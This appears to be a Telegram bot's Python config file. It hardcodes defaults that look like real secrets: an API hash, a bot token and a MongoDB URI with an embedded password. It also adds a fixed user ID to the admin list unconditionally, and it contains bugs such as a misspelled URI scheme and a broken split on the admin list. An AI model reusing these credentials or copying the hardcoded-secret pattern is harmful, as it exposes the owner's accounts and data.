# Don't Edit

import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
API_ID = int(os.getenv("API_ID", "23048198"))
API_HASH = os.environ.get("API_HASH", "3398a27e9a0c3d60657b2d7d45f31a37")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7163612647:AAFpZ3iSUfv8TZFpKd50-N5RRgN-2z7DWmM")
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split("5886772061")] if os.environ.get("ADMINS") else []
ADMIN = ADMINS
DATABASE_NAME = os.environ.get("DATABASE_NAME", "Cluster0")
DATABASE_URL = os.getenv("DATABASE_URL", "ongodb+srv://aaroha:aaroha@cluster0.xfupmjy.mongodb.net/?retryWrites=true&w=majority") 
OWNER_ID =  int(os.environ.get("OWNER_ID", "5886772061")) 
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(5886772061)
#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "-1002255639714")) 
UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "updates_chnl") # For Force Subscription
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True") # true if forward should be avoided
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", '') # image when someone hit /start # image when someone hit /start
LINK_BYPASS = "False"
